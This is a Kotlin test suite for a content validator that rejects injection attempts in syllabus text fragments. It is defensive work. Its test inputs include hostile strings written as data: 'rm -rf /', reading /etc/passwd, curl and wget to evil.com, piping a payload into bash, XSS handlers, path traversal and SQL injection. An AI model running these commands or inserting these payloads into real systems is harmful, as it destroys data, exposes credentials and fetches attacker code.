package com.borinquenterrier.cef

import io.kotest.assertions.throwables.shouldThrow
import io.kotest.core.spec.style.FunSpec
import io.kotest.matchers.shouldBe
import io.kotest.matchers.string.shouldContain

class ContributionValidatorTest : FunSpec({

    fun fragments(vararg texts: String) = texts.map {
        SourceFragment(text = it, pageNumber = null, sectionTitle = null, type = SourceType.TEXT, metadata = emptyMap())
    }

    // ── Clean input passes ────────────────────────────────────────────────────

    test("clean syllabus text passes validation") {
        ContributionValidator.validate(fragments("CS 101 meets Monday/Wednesday/Friday at 9am. Homework due Fridays."))
    }

    test("empty fragment list passes validation") {
        ContributionValidator.validate(emptyList())
    }

    test("multiple clean fragments pass validation") {
        ContributionValidator.validate(fragments("Midterm on October 15", "Final exam December 10"))
    }

    // ── Command / Shell Injection ─────────────────────────────────────────────

    test("command substitution \$(…) is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("grade: \$(cat /etc/passwd)"))
        }
        ex.label shouldContain "command substitution"
    }

    test("backtick execution is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("result: `whoami`"))
        }
        ex.label shouldContain "backtick"
    }

    test("rm -rf is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("rm -rf /"))
        }
        ex.label shouldContain "rm -rf"
    }

    test("sudo is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("sudo apt install malware"))
        }
        ex.label shouldContain "sudo"
    }

    test("chmod is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("chmod 777 /etc/shadow"))
        }
        ex.label shouldContain "chmod"
    }

    test("chown is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("chown root /bin/bash"))
        }
        ex.label shouldContain "chmod/chown"
    }

    test("curl is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("curl https://evil.com/payload"))
        }
        ex.label shouldContain "curl"
    }

    test("wget is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("wget https://evil.com/payload"))
        }
        ex.label shouldContain "curl/wget"
    }

    test("shell command with flags (bash -x) is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("bash -x script.sh"))
        }
        ex.label shouldContain "shell command"
    }

    test("python with flag is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("python -m malicious_module"))
        }
        ex.label shouldContain "shell command"
    }

    test("pipe into shell is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("cat payload | bash"))
        }
        ex.label shouldContain "pipe into shell"
    }

    // ── Script & HTML/JS Injection ────────────────────────────────────────────

    test("<script> tag is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("<script>alert('xss')</script>"))
        }
        ex.label shouldContain "script"
    }

    test("javascript: URL is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("click here: javascript:void(0)"))
        }
        ex.label shouldContain "javascript"
    }

    test("onload handler is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("<img onload=alert(1)>"))
        }
        ex.label shouldContain "onload"
    }

    test("onerror handler is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("<img src=x onerror=alert(1)>"))
        }
        ex.label shouldContain "onerror"
    }

    test("<iframe> is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("<iframe src='https://evil.com'></iframe>"))
        }
        ex.label shouldContain "iframe"
    }

    test("<object> is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("<object data='evil.swf'></object>"))
        }
        ex.label shouldContain "object"
    }

    test("<embed> is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("<embed src='evil.swf'>"))
        }
        ex.label shouldContain "object/embed"
    }

    // ── Path Traversal ────────────────────────────────────────────────────────

    test("Unix path traversal is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("read: ../../etc/passwd"))
        }
        ex.label shouldContain "path traversal"
    }

    test("Windows path traversal is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("read: ..\\..\\windows\\system32"))
        }
        ex.label shouldContain "path traversal"
    }

    // ── SQL Injection ─────────────────────────────────────────────────────────

    test("DROP TABLE is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("DROP TABLE users"))
        }
        ex.label shouldContain "DROP"
    }

    test("DELETE FROM is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("DELETE FROM events WHERE 1=1"))
        }
        ex.label shouldContain "DELETE"
    }

    test("UNION SELECT is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("' UNION SELECT * FROM users --"))
        }
        ex.label shouldContain "UNION"
    }

    test("INSERT INTO is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("INSERT INTO users VALUES ('admin','pw')"))
        }
        ex.label shouldContain "INSERT"
    }

    test("UPDATE SET is rejected") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("UPDATE users SET password='hacked' WHERE 1=1"))
        }
        ex.label shouldContain "UPDATE"
    }

    // ── ContributionPoisonException message ───────────────────────────────────

    test("exception message includes label and snippet") {
        val ex = shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("sudo rm -rf /"))
        }
        ex.message shouldContain ex.label
        ex.message shouldContain ex.snippet
    }

    // ── Poison in second fragment is still caught ─────────────────────────────

    test("poison in second fragment is detected") {
        shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("clean text", "DROP TABLE events"))
        }
    }

    // ── Case-insensitive matching ─────────────────────────────────────────────

    test("SUDO (uppercase) is rejected") {
        shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("SUDO apt install malware"))
        }
    }

    test("drop table (lowercase) is rejected") {
        shouldThrow<ContributionPoisonException> {
            ContributionValidator.validate(fragments("drop table users"))
        }
    }
})
